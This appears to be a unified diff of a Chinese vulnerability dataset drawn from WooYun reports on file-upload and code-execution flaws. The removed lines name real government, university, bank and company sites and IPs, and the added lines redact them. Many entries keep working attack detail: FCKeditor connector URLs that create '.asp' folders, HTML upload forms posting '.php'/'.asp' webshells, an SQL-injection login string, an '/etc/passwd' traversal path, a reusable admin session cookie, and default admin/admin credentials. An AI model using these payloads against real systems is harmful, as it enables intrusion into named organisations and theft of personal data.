-**详情**: http://**.**.**.**/上传点 http://**.**.**.**/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0上传后http://**.**.**.**/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/201509211711274543
+**详情**: http://**.**.**.**/上传点 http://**.**.**.**/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0上传后http://**.**.**.**/defaultroothttps://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9816,9 +9816,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 厂商：上海君睿信息技术有限公司系统名称：特种设备作业人员管理平台漏洞问题：文件上传漏洞文件：dwbm_kzbm.do（特种设备作业人员考核申请表）关键字：技术支持：上海君睿信息技术有限公司根据搜索引擎，列举部分不完全案例如下：江苏省特种设备管理平台：http://www.jstsks.com/index.shtml湖南省特种设备管理平台：http://www.hntskh.com/index.shtml安徽省特种设备管理平台：http://www.ahtsks.com/index.shtml四川省特种设备管理平台：http://www.sctzsbzy.com/default.shtml海南省特种设备管理平台：http://www.hntsks.com/index.shtml贵州省特种设备管理平台：http://www.gztsks.com/index.shtml吉林省特种设备管理平台：h
+**详情**: 厂商：上海君睿信息技术有限公司系统名称：特种设备作业人员管理平台漏洞问题：文件上传漏洞文件：dwbm_kzbm.do（特种设备作业人员考核申请表）关键字：技术支持：上海君睿信息技术有限公司根据搜索引擎，列举部分不完全案例如下：江苏省特种设备管理平台：https://example.com/[已脱敏]
 
-**POC**: 漏洞证明：贵州省特种设备管理平台：http://www.gztsks.com/index.shtml为例：http://www.gztsks.com/dwbm_kzbm.do头像上传处过滤存在缺陷。。POST /uploadksimg.do?suffix=jpg&filename=files HTTP/1.1Host: www.gztsks.comProxy-Connection: keep-aliveContent-Length: 2507Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/x
+**POC**: 漏洞证明：贵州省特种设备管理平台：https://example.com/[已脱敏] /uploadksimg.do?suffix=jpg&filename=files HTTP/1.1Host: www.gztsks.comProxy-Connection: keep-aliveContent-Length: 2507Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/x
 
 **绕过**: 直接利用
 
@@ -9860,7 +9860,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上次没有通过http://www.wooyun.org/bugs/wooyun-2010-0105508/trace/9c949f564ded401dd228377c516ce91e这次上传图片 上次忘记了 不会意思 不会重复了吗正方教务管理系统 jwgl.jxtcmi.comhttp://www.jxutcm.edu.cn/ 江西中医药大学 |jwgl.jxtcmi.com存在fck 证明看图片
+**详情**: 上次没有通过https://example.com/[已脱敏] 上次忘记了 不会意思 不会重复了吗正方教务管理系统 jwgl.jxtcmi.comhttps://example.com/[已脱敏] 江西中医药大学 |jwgl.jxtcmi.com存在fck 证明看图片
 
 **POC**: (见原文)
 
@@ -9904,7 +9904,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看到人社局的网站有fckedit，于是试了试，前面测试了很多次，没有成功，感觉网上介绍的方法没法上传。首先：上传word、图片之类的可以，但是ASP，asa、aspx都不行，文件名中加点也不行，最后用上传文件夹名为1.asp，它会被改名为1_asp,成下划线了，也不行，都快要放弃时想想修改参数试试，结果成功了。修改的参数：http://www.hasmx.hrss.gov.cn//FckEditor/editor/filemanager/connectors/aspx/connector.aspx?Command=CreateFolder&Type=File&CurrentFolder=/a.asp&NewFolderName=z&uuid=1369647267562
+**详情**: 看到人社局的网站有fckedit，于是试了试，前面测试了很多次，没有成功，感觉网上介绍的方法没法上传。首先：上传word、图片之类的可以，但是ASP，asa、aspx都不行，文件名中加点也不行，最后用上传文件夹名为1.asp，它会被改名为1_asp,成下划线了，也不行，都快要放弃时想想修改参数试试，结果成功了。修改的参数：https://example.com/[已脱敏]
 
 **POC**: 详细说明已经有了
 
@@ -9950,7 +9950,7 @@
 
 **详情**: 可通过上传头像执行PHP脚本(浏览代码，修改代码，脱库)
 
-**POC**: 访问 http://www.saike.com/cciceimage/adpg/20151219085558_152.jpg/.php 发现其头部信息为X-Powered-By:PHP/5.2.13
+**POC**: 访问 https://example.com/[已脱敏] 发现其头部信息为X-Powered-By:PHP/5.2.13
 
 **绕过**: 直接利用
 
@@ -9959,7 +9959,7 @@
 
 ---
 ### [wooyun-2013-044524] 联通某省分站任意上传漏洞可导致服务器沦陷
-**厂商**: 中国联通 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -9992,13 +9992,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 存在问题的页面：BVvisit20\Tomcat-5.5_v5.0\webapps\ivss\web\jwzt\service09\meetingRoom\upload_img.jsp该页面尽管是管理功能页面但是没有权限验证，可以直接访问。比如：http://cftv.forestry.gov.cn:8080/ivss/web/jwzt/service09/meetingRoom/upload_img.jsp这个系统不是太好找，在搜索引擎中搜索/ivss/web/jwzt可以找到一些例子。
+**详情**: 存在问题的页面：BVvisit20\Tomcat-5.5_v5.0\webapps\ivss\web\jwzt\service09\meetingRoom\upload_img.jsp该页面尽管是管理功能页面但是没有权限验证，可以直接访问。比如：https://example.com/[已脱敏]
 
-**POC**: 以国家林业局为例：http://cftv.forestry.gov.cn:8080/ivss/web/jwzt/service09/meetingRoom/upload_img.jsp直接上传jsp脚本，提交以后在当前页查看源码就可以看到webshell的路径；上图中文件的时间是2012年，最近7月29和30日也有一兄弟在利用这个上传问题。
+**POC**: 以国家林业局为例：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 1. 去除废弃不用的页面；2.验证上传的文件格式；（建议增加服务端java验证而不仅仅是客户端的js验证）3.可能是版本比较杂，有的版本的后台管理多个页面没有权限验证；另外，国家林业局的http://cftv.forestry.gov.cn:8080/cms/frame/login.jsp这里是默认
+**修复**: 1. 去除废弃不用的页面；2.验证上传的文件格式；（建议增加服务端java验证而不仅仅是客户端的js验证）3.可能是版本比较杂，有的版本的后台管理多个页面没有权限验证；另外，国家林业局的https://example.com/[已脱敏]
 ---
 
 ---
@@ -10016,7 +10016,7 @@
 
 **详情**: 
 
-**POC**: 后台地址：http://www.ldrk.net.cn/console/index.html账户admin密码admin任意文件下载：http://www.ldrk.net.cn/public/downloadFile.jsp?filePathName=/../public/downloadFile.jsp文章编辑页面存在上传漏洞可以导致直接getshell之前忘记截图了，就不演示上传了！
+**POC**: 后台地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10036,7 +10036,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞地址：http://isdm.nuc.edu.cn/Edit/editor/img.htm#上传xx.aspx.jpg文件，抓包修改文件名为xx.aspx，成功上传：
+**详情**: 漏洞地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -10058,9 +10058,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://125.39.72.61:8080/迅雷某上传页面,可上传任意文件.无需登陆...直接上传....上传成功后会返回文件名称...我就不放文件路径了....省的被搞.
+**详情**: http://[IP已脱敏]
 
-**POC**: http://125.39.72.61:8080/迅雷某上传页面,可上传任意文件.
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -10082,7 +10082,7 @@
 
 **详情**: 河南中烟工业有限责任公司通讯录系统未授权访问，struts任意代码执行漏洞，mysql数据库root权限泄露大量员工联系电话
 
-**POC**: 地址：http://218.28.239.43:8080/main2.jsp无需登录即可访问，大量手机号码泄露struts漏洞，mysql权限为root导致其他数据库泄露，地址：http://218.28.239.43:8080/backstage/LoginAction!adminExit.action
+**POC**: 地址：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -10124,9 +10124,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 搜索：http://203.208.46.145/#newwindow=1&q=inurl:web!getItem.action前人经验：WooYun: 某政务服务中心系统通用任意文件上传、任意文件下载、敏感信息遍历西辰软件有限公司 http://www.westarsoft.com/发现的是不同于他的那个文件下载。
+**详情**: 搜索：http://[IP已脱敏] 某政务服务中心系统通用任意文件上传、任意文件下载、敏感信息遍历西辰软件有限公司 https://example.com/[已脱敏]
 
-**POC**: http://kxspdb.cn/mbox!topagex.action?gotopage=WEB-INF/web.xml&wtvo.pid=WEBTITLE00000034http://dzxz.gov.cn/mbox!topagex.action?gotopage=WEB-INF/web.xml&wtvo.pid=WEBTITLE00000034http://www.jqsxzfwzx.com.cn/mbox!topagex.action?gotopage=WEB-INF/web.xml&wtvo.pid=WEBTITLE00000034
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10146,7 +10146,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1，某客户网站后台弱口令   http://jinyuedb.com/admin     admin   1234562，后台任意文件上传       http://jinyuedb.com/admin/sctp.aspx3，密码明文保存
+**详情**: 1，某客户网站后台弱口令   https://example.com/[已脱敏]     admin   1234562，后台任意文件上传       https://example.com/[已脱敏]
 
 **POC**: 1，客户网站数目：461+2222，明文密码3，安全狗
 
@@ -10190,7 +10190,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 代码在https://github.com/zhangdaiscott/jeecg/blob/02d82286e4dcc58c75711a15487f691c7702f553/src/main/java/org/jeecgframework/web/system/controller/core/LoginController.javaloginController是登陆控制器，有两个参数goPwdInit和pwdInit@RequestMapping(params = "goPwdInit")public String goPwdInit() {return "login/pwd_init";}/*** admin账户密码初始化** @param request* @return*/@RequestMapping(params = "pwdInit")public ModelAndView
+**详情**: 代码在https://example.com/[已脱敏] = "goPwdInit")public String goPwdInit() {return "login/pwd_init";}/*** admin账户密码初始化** @param request* @return*/@RequestMapping(params = "pwdInit")public ModelAndView
 
 **POC**: (见原文)
 
@@ -10256,9 +10256,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 重庆中小学数字校园管理平台，藐视是由重庆市教育信息技术与装备中心提供的，重庆环博软件（www.huanbo99.com）开发的藐视整个重庆地区使用的中小学不少，上环博软件看看了案例发现这个系统也是无意之间发现的，http://222.182.201.152:8080直接尝试万能密码：账号：admin' or 'a'='a密码：任意成功登陆2.任意文件上传找了半天，在学生援助这个地方找到了一个上传附件的地方利用burp suite，修改上传文件的后缀，成功上传了asp一句话成功连接一句话
+**详情**: 重庆中小学数字校园管理平台，藐视是由重庆市教育信息技术与装备中心提供的，重庆环博软件（www.huanbo99.com）开发的藐视整个重庆地区使用的中小学不少，上环博软件看看了案例发现这个系统也是无意之间发现的，http://[IP已脱敏]直接尝试万能密码：账号：admin' or 'a'='a密码：任意成功登陆2.任意文件上传找了半天，在学生援助这个地方找到了一个上传附件的地方利用burp suite，修改上传文件的后缀，成功上传了asp一句话成功连接一句话
 
-**POC**: 重庆中小学数字校园管理平台，藐视是由重庆市教育信息技术与装备中心提供的，重庆环博软件（www.huanbo99.com）开发的藐视整个重庆地区使用的中小学不少，上环博软件看看了案例发现这个系统也是无意之间发现的，http://222.182.201.152:8080直接尝试万能密码：账号：admin' or 'a'='a密码：任意成功登陆2.任意文件上传找了半天，在学生援助这个地方找到了一个上传附件的地方利用burp suite，修改上传文件的后缀，成功上传了asp一句话成功连接一句话
+**POC**: 重庆中小学数字校园管理平台，藐视是由重庆市教育信息技术与装备中心提供的，重庆环博软件（www.huanbo99.com）开发的藐视整个重庆地区使用的中小学不少，上环博软件看看了案例发现这个系统也是无意之间发现的，http://[IP已脱敏]直接尝试万能密码：账号：admin' or 'a'='a密码：任意成功登陆2.任意文件上传找了半天，在学生援助这个地方找到了一个上传附件的地方利用burp suite，修改上传文件的后缀，成功上传了asp一句话成功连接一句话
 
 **绕过**: 直接利用
 
@@ -10280,7 +10280,7 @@
 
 **详情**: 后台登录页面 使用 'or'='or' 直接登录，fckeditor编辑器构造表单上传。之前已经有大黑阔提权，或者脱裤。
 
-**POC**: http://www.nd56.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Media&CurrentFolder=%2F&NewFolderName=1.asp后台 http://www.nd56.com/e9web-admin/login.htm
+**POC**: https://example.com/[已脱敏] https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10300,9 +10300,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某旅游网站管理系统SQL注射&任意文件上传。关键字搜索：inurl:way/show.asp?id=第一处漏洞：在/way/show.asp?id=处存在SQL注射。案例如下：http://www.ocanadatravel.com/way/show.asp?id=141http://www.gdyy-travel.com/way/show.asp?id=125http://www.wo-long-gang.com/way/show.asp?id=2http://www.nanjingdongdu.com/way/show.asp?id=97http://www.hs128.com/hs128/way/show.asp?id=44http://www.zgszkh.com/way/show.asp?id=2392http://www.83108310.com/way/show.asp?id
+**详情**: 某旅游网站管理系统SQL注射&任意文件上传。关键字搜索：inurl:way/show.asp?id=第一处漏洞：在/way/show.asp?id=处存在SQL注射。案例如下：https://example.com/[已脱敏]
 
-**POC**: 第二处漏洞。存在任意文件上传漏洞，可直接上传ASP，getshell。漏洞上传地址：/htmleditor/file.asp上传后文件路径：/uploadfiles/xx.asp 可通过查看上传后的源代码得知。案例如下：http://www.zgszkh.com//htmleditor/file.asphttp://minibustour.cn//htmleditor/file.asphttp://www.wygk.cn/LY//htmleditor/file.asphttp://www.guolv020.com//htmleditor/file.asphttp://www.letyouyou
+**POC**: 第二处漏洞。存在任意文件上传漏洞，可直接上传ASP，getshell。漏洞上传地址：/htmleditor/file.asp上传后文件路径：/uploadfiles/xx.asp 可通过查看上传后的源代码得知。案例如下：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10322,7 +10322,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 青阳县机构编制委员会办公室http://www.ahqybb.gov.cn/syWebEditor/UpImg.asp通过burpsuite截断上传。。
+**详情**: 青阳县机构编制委员会办公室https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -10344,9 +10344,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://oa.dld.com/继续使用以前的exp:<form enctype="multipart/form-data" action="http://oa.dld.com/general/vmeet/wbUpload.php?fileName=test.php+" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>
+**详情**: https://example.com/[已脱敏] enctype="multipart/form-data" action="https://example.com/[已脱敏]" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>
 
-**POC**: 一句话地址:http://oa.dld.com//general/vmeet/wbUpload/test.php好像是system权限,因为我可以删system32里面的东西.膜拜大黑阔！！！超级无敌后门删不掉,运维叔叔记得重装备份一下重装系统啊,不然你懂的再送几张在system32里面分析的几个文件吧里面的w3wp.exemicrox.exe还有microsft.exe 和system.exe应该还有
+**POC**: 一句话地址:https://example.com/[已脱敏] 和system.exe应该还有
 
 **绕过**: 直接利用
 
@@ -10388,7 +10388,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: Fckeditor编辑器漏洞啊··http://xxcj.sasac.gov.cnhttp://xxcj.sasac.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector直接上传JSP木马·取得权限
+**详情**: Fckeditor编辑器漏洞啊··https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -10412,7 +10412,7 @@
 
 **详情**: 之前把漏洞上报在了cnvd，应cnvd要求把该漏洞上报至wooyun来。
 
-**POC**: 科创CMS上传0day存在位置/creatorcms/comm_front/email/uploadImageFile_do.jsp/comm_front/email/uploadImageFile_do.jsp通过谷歌搜索关键字可以看到相关的政府网站http://www.google.com.hk/search?hl=zh-Hans-HK&source=hp&q=comm_front%2Femail%2F&gbv=2&oq=comm_front%2Femail%2F&gs_l=heirloom-hp.12...15360.15360.0.16453.1.1.0.0.0.0.0.0..0.0.
+**POC**: 科创CMS上传0day存在位置/creatorcms/comm_front/email/uploadImageFile_do.jsp/comm_front/email/uploadImageFile_do.jsp通过谷歌搜索关键字可以看到相关的政府网站https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10432,9 +10432,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 河南省农村信用社联合社WooYun: 河南省农村信用联社官网(hnnx.com)主站服务器提权漏洞2012-9月 一年了 真快刚提交了一篇  然后突然想到这个 昨天晚上的测试，就有了这一篇我哥在平顶山负责农信网的机房工作 所以我会长关注。昨晚 发现了后台上传漏洞http://www.hnnx.com/sysadmin/FCKeditor/fckeditor.html对  是任意上传，但是 asp asa cer php ashx jspx。。。都不行 要不就是半执行状态，无语。  发现jsp解析，但是：访问时：http://www.hnnx.com//sysadmin/editor/sharefile/image/(20130905010534)X.jsp显然 需要后台验证权限。。然后 就是上一篇：河南省农村信用社联合社--伪大数据入后台   突然想到  登陆后台的情况下在访问 同域传值 
+**详情**: 河南省农村信用社联合社WooYun: 河南省农村信用联社官网(hnnx.com)主站服务器提权漏洞2012-9月 一年了 真快刚提交了一篇  然后突然想到这个 昨天晚上的测试，就有了这一篇我哥在平顶山负责农信网的机房工作 所以我会长关注。昨晚 发现了后台上传漏洞https://example.com/[已脱敏]  是任意上传，但是 asp asa cer php ashx jspx。。。都不行 要不就是半执行状态，无语。  发现jsp解析，但是：访问时：https://example.com/[已脱敏])X.jsp显然 需要后台验证权限。。然后 就是上一篇：河南省农村信用社联合社--伪大数据入后台   突然想到  登陆后台的情况下在访问 同域传值 
 
-**POC**: http://www.hnnx.com/sysadmin/FCKeditor/fckeditor.html对  是任意上传，但是 asp asa cer php ashx jspx。。。都不行 要不就是半执行状态，无语。  发现jsp解析，但是：访问时：http://www.hnnx.com//sysadmin/editor/sharefile/image/(20130905010534)X.jsp显然 需要后台验证权限。。然后 就是上一篇：河南省农村信用社联合社--伪大数据入后台   突然想到  登陆后台的情况下在访问 同域传值  怎么样呢？完全访问！上图：
+**POC**: https://example.com/[已脱敏]  是任意上传，但是 asp asa cer php ashx jspx。。。都不行 要不就是半执行状态，无语。  发现jsp解析，但是：访问时：https://example.com/[已脱敏])X.jsp显然 需要后台验证权限。。然后 就是上一篇：河南省农村信用社联合社--伪大数据入后台   突然想到  登陆后台的情况下在访问 同域传值  怎么样呢？完全访问！上图：
 
 **绕过**: 直接利用
 
@@ -10454,7 +10454,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 可利用地址：http://www.dianyisheji.com/fckeditor/editor/filemanager/connectors/test.htmlfckeditor上传未经过权限验证，很危险，通杀一切
+**详情**: 可利用地址：https://example.com/[已脱敏]
 
 **POC**: 官方服务器上同时还有上百家用户的网站，均同样的问题官方网站的检测图片：
 
@@ -10500,7 +10500,7 @@
 
 **详情**: 美的官方某分站上传漏洞
 
-**POC**: 美的集团真是什么都做啊，还做小额贷款http://202.104.30.185/http://202.104.30.185/adminfckeditor漏洞，遍历目录http://202.104.30.185/fckeditor//editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/..fckeditor可直接上传任意格式GETWebshellhttp://202.104.30.185/UserFiles//Image/ind.js
+**POC**: 美的集团真是什么都做啊，还做小额贷款http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -10509,7 +10509,7 @@
 
 ---
 ### [wooyun-2014-072038] 李宁官网被解析html用来做游戏私服
-**厂商**: http://www.li-ning.com.cn/ | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
+**厂商**: https://example.com/[已脱敏] | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -10520,7 +10520,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址http://www.li-ning.com.cn/uploadfile/07029/2014072945099.html这私服也太刁了吧....
+**详情**: 地址https://example.com/[已脱敏]
 
 **POC**: 哎，快通知官网联系此私服管理追究责任吧...
 
@@ -10544,7 +10544,7 @@
 
 **详情**: 漏洞原理正方教务管理系统是一套基于B/S和C/S全向兼容的管理系统。一般存在B/S架构的页面的IP开放了211端口,即可连接其C/S架构的管理系统,在C/S架构的查询过程中,对发起的TCP回话内容为固定值,可导致为经授权执行SQL查询语句等问题,在SQL查询过程中通过数据库语句可查询到关键账户,通过破解关键账户的密码,获得该教务管理系统的控制权限,随性发挥查询、改成绩什么的、都是浮云。另外求邀请码一个
 
-**POC**: 1.在网上找到的一个教务系统,大连大学的,大连是个好地方啊。2.202.199.155.2:211 是开放的,证明对公网开放的C/S架构的管理方式。使用连接器测试之。提示连接成功,即可执行SQL3.该系统一般都会有一个默认账号,JWC01这个是教务处的账号,权限非常大,可以操作转学，退学什么的。相当的可怕,如果被恶意用户利用,影响也非常严重,对于该系统的密码也是可逆的。4.最终得到jwc01的账号。5.通过该账号可以查询到学生的详细信息,包括身份证号、手机号等。还有家人信息。如果该信息落入到电信诈骗人员手中,将造成很大的社会危害。
+**POC**: 1.在网上找到的一个教务系统,大连大学的,大连是个好地方啊。[IP已脱敏].2:211 是开放的,证明对公网开放的C/S架构的管理方式。使用连接器测试之。提示连接成功,即可执行SQL3.该系统一般都会有一个默认账号,JWC01这个是教务处的账号,权限非常大,可以操作转学，退学什么的。相当的可怕,如果被恶意用户利用,影响也非常严重,对于该系统的密码也是可逆的。4.最终得到jwc01的账号。5.通过该账号可以查询到学生的详细信息,包括身份证号、手机号等。还有家人信息。如果该信息落入到电信诈骗人员手中,将造成很大的社会危害。
 
 **绕过**: 直接利用
 
@@ -10564,7 +10564,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: # 影响服务器http://forum.acg.haier.net/bbs/robots.txt/a.php# discuz论坛+nginx配置不当http://forum.acg.haier.net/bbs/robots.txt/a.php任意文件解析为php文件执行，即可获取服务器系统权限
+**详情**: # 影响服务器https://example.com/[已脱敏] discuz论坛+nginx配置不当https://example.com/[已脱敏]
 
 **POC**: Windows IP 配置主机名  . . . . . . . . . . . . . : hr_ACG01主 DNS 后缀 . . . . . . . . . . . :节点类型  . . . . . . . . . . . . : 混合IP 路由已启用 . . . . . . . . . . : 否WINS 代理已启用 . . . . . . . . . : 否以太网适配器 Team 1:连接特定的 DNS 后缀 . . . . . . . :描述. . . . . . . . . . . . . . . : BASP Virtual Adapter物理地址. . . . . . . . 
 
@@ -10575,7 +10575,7 @@
 
 ---
 ### [wooyun-2015-0134222] 云南移动某业务管理平台存在帐号密码暴力破解+越权查看任意人员帐号信息+任意文件上传漏洞
-**厂商**: 中国移动 | **年份**: 2015 | **类型**: 敏感信息泄露
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 敏感信息泄露
 
 **元思考**: 触发信号: 功能测试
 
@@ -10586,9 +10586,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://183.224.74.252/Login.aspx
+**详情**: http://[IP已脱敏]
 
-**POC**: 登录页面可暴力破解，登录页面抓包然后开始爆破，查看数据包长度，成功爆出帐号密码登录业务系统test/test123可查看很多信息可查看任意人员帐号信息点击编辑可查看人员帐号信息，密码还是明文。。。大家好，我是明文！下面说说越权点击人员管理选项抓包得到人员管理页面文件信息可通过抓取到UserManage.aspx页面查看到人员帐号信息，如果在没有进业务系统的情况直接访问http://183.224.74.252/UserManage.aspx会跳转到首页登录界面，所以可绕过验证访问人员管理页面。直接在浏览器上打开http://183.224.74.252/UserManage.aspx抓包查看返
+**POC**: 登录页面可暴力破解，登录页面抓包然后开始爆破，查看数据包长度，成功爆出帐号密码登录业务系统test/test123可查看很多信息可查看任意人员帐号信息点击编辑可查看人员帐号信息，密码还是明文。。。大家好，我是明文！下面说说越权点击人员管理选项抓包得到人员管理页面文件信息可通过抓取到UserManage.aspx页面查看到人员帐号信息，如果在没有进业务系统的情况直接访问http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -10608,7 +10608,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.hnea.gov.cn/manage/content/docmanage/download.jsp?filePath=/../../../../../../etc/passwd
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -10630,7 +10630,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网站找到一处上传的地方，上传一个phpinfo的图片，进行测试。http://www.quyou.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/snsinfo/20121219161451_9091.jpg/x.php问题果然存在然后，你懂的。看了一下网站的功能，可以在线支付。里面存在支付网关，是不是可以..
+**详情**: 网站找到一处上传的地方，上传一个phpinfo的图片，进行测试。https://example.com/[已脱敏]
 
 **POC**: 权限很大，服务也很多，不做进一部检测了。
 
@@ -10654,7 +10654,7 @@
 
 **详情**: 官网:www.ycxl.netUrl:http://www.***.com/admin/upfile.asp?folder=../upload&insert=wj通用Cookie:ASPSESSIONIDAQDBADDQ=CPLIPMADOGIGCLJFFHNGJABP; cmsname=admin; cmsid=1
 
-**POC**: 官网:www.ycxl.netUrl:http://www.***.com/admin/upfile.asp?folder=../upload&insert=wj通用Cookie:ASPSESSIONIDAQDBADDQ=CPLIPMADOGIGCLJFFHNGJABP; cmsname=admin; cmsid=1随便找一个案例  比如:http://www.nzwuye.com/填入提交地址和cookie点击上传 显示成功已成功获取webshell同样填入提交地址和cookie照样获取webshell
+**POC**: 官网:www.ycxl.netUrl:http://www.***.com/admin/upfile.asp?folder=../upload&insert=wj通用Cookie:ASPSESSIONIDAQDBADDQ=CPLIPMADOGIGCLJFFHNGJABP; cmsname=admin; cmsid=1随便找一个案例  比如:https://example.com/[已脱敏] 显示成功已成功获取webshell同样填入提交地址和cookie照样获取webshell
 
 **绕过**: 直接利用
 
@@ -10718,9 +10718,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: system_dntb的编辑器没啥可说的。漏洞页面http://www.sxwsks.com/system_dntb/uploadFile.aspx编辑cookie直接上传UserType=0; IsEdition=0; Info=1; uploadFolder=../system_dntb/Upload/;看了下服务器上的信息量挺大的
+**详情**: system_dntb的编辑器没啥可说的。漏洞页面https://example.com/[已脱敏] IsEdition=0; Info=1; uploadFolder=../system_dntb/Upload/;看了下服务器上的信息量挺大的
 
-**POC**: 就装了一个360，提权应该难度不大吧？我就不进内网看了，对这些没有兴趣，主要想混个Wooyun ID学习下http://www.sxwsks.com/wooyun.txt
+**POC**: 就装了一个360，提权应该难度不大吧？我就不进内网看了，对这些没有兴趣，主要想混个Wooyun ID学习下https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10762,7 +10762,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 咯咯~http://www.tzrc.cn/uploadpic.htm
+**详情**: 咯咯~https://example.com/[已脱敏]
 
 **POC**: 咯咯~
 
@@ -10784,9 +10784,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.e-xxcs.cn/http://ccidstudy.ccidnet.com/两个同一个站点注册一个会员账号 在个人中心->修改资料 头像上传处可上传任意文件
+**详情**: https://example.com/[已脱敏] 在个人中心->修改资料 头像上传处可上传任意文件
 
-**POC**: http://www.e-xxcs.cn/http://ccidstudy.ccidnet.com/两个同一个站点
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10806,7 +10806,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 武钢集团国际经济贸易总公司网站，访问url：http://intl.wisco.com.cn网站 http://intl.wisco.com.cn/cms/app存在目录遍历漏洞，可查看app目录所有文件咯····后台部分模块存在未授权访问，可以进入页面进行操作可以创建广告位咯······用户授权操作模块存在越权访问，可修改多个栏目的编辑权限，地址：http://intl.wisco.com.cn/cms/app/permission/userPreivileges-old.jsp网站根路径暴露了····貌似还存在文件上传，但是没深入尝试了·····
+**详情**: 武钢集团国际经济贸易总公司网站，访问url：https://example.com/[已脱敏] https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -10852,7 +10852,7 @@
 
 **详情**: 1.google关键字inurl:_jbrcms"Powered By:©JBR-CMS Version:V4.5"2.多数网站没有改默认数据库位置，导致数据库可被下载e.g.: www.zjyzkf.com/_jbrcms/%23JbrCMSDB/%23JbrData.mdb密码为md5加密，破解后可进入后台3.后台批量上传存在上传漏洞详见证明
 
-**POC**: 上传漏洞：批量上传POC:<html><body><form action="http://xxx.com/_jbrcms/_News/update.asp?bs=&id=1" method="post"enctype="multipart/form-data"><input type="text" name="Filename" value="1.asp"/><input type="file" name="Filedata" /><br /><input type="submit" name="Upload" value="Submit Query" /></form></body></h
+**POC**: 上传漏洞：批量上传POC:<html><body><form action="https://example.com/[已脱敏]" method="post"enctype="multipart/form-data"><input type="text" name="Filename" value="1.asp"/><input type="file" name="Filedata" /><br /><input type="submit" name="Upload" value="Submit Query" /></form></body></h
 
 **绕过**: 直接利用
 
@@ -10872,7 +10872,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
